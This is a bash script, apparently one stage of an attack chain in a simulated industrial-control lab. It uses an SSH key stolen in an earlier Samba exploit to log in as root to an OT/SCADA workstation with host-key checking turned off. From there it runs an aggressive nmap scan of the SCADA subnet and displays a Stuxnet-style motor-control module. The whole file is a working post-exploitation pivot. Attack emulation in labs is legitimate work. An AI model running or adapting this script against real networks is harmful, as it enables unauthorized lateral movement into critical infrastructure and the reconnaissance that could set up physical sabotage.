#!/bin/bash
#
# access-ot-ws.sh — SSH into the OT workstation using the stolen stux-key,
#                   scan the OT network, and inspect the stuxnet PSM module.
#
# Args (all optional; env vars are used as fallback):
#   $1  OT_WS_IP   — IP of the OT/SCADA workstation to SSH into
#   $2  OT_CIDR    — CIDR of the OT/SCADA network to scan after pivoting
#   $3  SSH_KEY    — Path to the SSH private key (default: /root/.ssh/stux-key)
#
# Env vars injected automatically by the topology (build_topology_env):
#   CONTAINER_ENG_WS_IP              — engineering workstation (OT side)
#   CONTAINER_HMI_WORKSTATION_IP     — HMI workstation
#   CONTAINER_ENGINEERING_STATION_IP — alternative name
#   SUBNET_SCADA_NETWORK_CIDR        — SCADA subnet CIDR

OT_WS_IP="${1:-${CONTAINER_ENG_WS_IP:-${CONTAINER_HMI_WORKSTATION_IP:-${CONTAINER_ENGINEERING_STATION_IP:-}}}}"
OT_CIDR="${2:-${SUBNET_SCADA_NETWORK_CIDR:-${SUBNET_OT_NETWORK_CIDR:-}}}"
SSH_KEY="${3:-/root/.ssh/stux-key}"

if [[ -z "$OT_WS_IP" ]]; then
    echo "[!] No OT workstation IP provided. Pass as \$1 or set CONTAINER_ENG_WS_IP env var."
    exit 1
fi

if [[ -z "$OT_CIDR" ]]; then
    echo "[!] No OT network CIDR provided. Pass as \$2 or set SUBNET_SCADA_NETWORK_CIDR env var."
    exit 1
fi

if [[ ! -f "$SSH_KEY" ]]; then
    echo "[!] SSH key not found at $SSH_KEY — run exploit-samba.sh first and save the key."
    exit 1
fi

echo "Accessing the OT workstation using the stux-key obtained from the Samba exploit..."
echo "  OT Workstation : $OT_WS_IP"
echo "  OT Network     : $OT_CIDR"
echo "  SSH Key        : $SSH_KEY"

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no "root@$OT_WS_IP" \
    "nmap $OT_CIDR -T5 && cd /scripts/workstation/stuxnet/deploy_stuxnet && cat motor_stuxnet_psm.py"
